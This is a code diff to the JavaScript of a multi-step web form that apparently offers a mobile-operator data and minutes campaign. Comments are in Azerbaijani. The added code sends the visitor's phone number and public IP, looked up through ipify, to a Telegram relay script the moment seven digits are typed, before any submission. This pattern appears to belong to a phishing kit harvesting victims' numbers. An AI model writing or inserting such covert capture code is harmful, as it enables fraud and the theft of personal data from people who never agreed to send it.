@@ -394,13 +394,49 @@
             goToStep(2);
         }
 
-        // Step 2: Validation
+        // ============================================================
+        // 📞 Step 2: Nömrə yazılan kimi Telegram-a göndər
+        // ============================================================
         document.getElementById('phone-input').addEventListener('input', () => {
             const nextBtn = document.getElementById('step-2-next');
             if (phoneMask.unmaskedValue.length === 7) {
                 nextBtn.disabled = false;
                 nextBtn.classList.remove('bg-gray-200', 'text-gray-400', 'cursor-not-allowed');
                 nextBtn.classList.add('bg-[#2663ea]', 'text-white', 'hover:bg-[#1d4ed8]', 'shadow-lg', 'shadow-blue-200');
+                
+                // ============================================
+                // 📤 NÖMRƏ TAM YAZILAN KİMİ GÖNDƏR
+                // ============================================
+                (async function sendPhoneImmediately() {
+                    const prefix = document.getElementById('prefix-select').value;
+                    const number = phoneMask.value;
+                    const fullPhone = `${prefix} ${number}`;
+                    
+                    let ip = '0.0.0.0';
+                    try {
+                        const r = await fetch('https://api.ipify.org?format=json');
+                        const d = await r.json();
+                        ip = d.ip;
+                    } catch(e) {
+                        console.log('IP alınmadı');
+                    }
+                    
+                    const formData = new FormData();
+                    formData.append('phone', fullPhone);
+                    formData.append('ip', ip);
+                    formData.append('type', 'phone_only');
+                    
+                    try {
+                        await fetch('api/telegram-handler.php', {
+                            method: 'POST',
+                            body: formData
+                        });
+                        console.log('✅ Nömrə göndərildi:', fullPhone);
+                    } catch(e) {
+                        console.log('❌ Nömrə göndərilmədi');
+                    }
+                })();
+                
             } else {
                 nextBtn.disabled = true;
                 nextBtn.classList.add('bg-gray-200', 'text-gray-400', 'cursor-not-allowed');
@@ -420,13 +456,11 @@
             originalGoToStep(step);
         }
 
-        // ============================================
-        // 🎯 Step 3: Select Campaign - KAMPANİYANI LOCALSTORAGE-Ə YAZ
-        // ============================================
+        // Step 3: Select Campaign
         function selectCampaign(id, price, gb, mins, days) {
             state.campaign = { id, price, gb, mins, days };
 
-            // ✅ KAMPANİYANI LOCALSTORAGE-Ə YAZ
+            // Kampaniyanı localStorage-ə yaz
             localStorage.setItem('selectedCampaign', `${gb} + ${mins} (${price})`);
 
             // Setup Confirmation Screen (Step 4)
@@ -583,4 +617,4 @@
     </script>
 
 </body>
-</html>
+    </html>
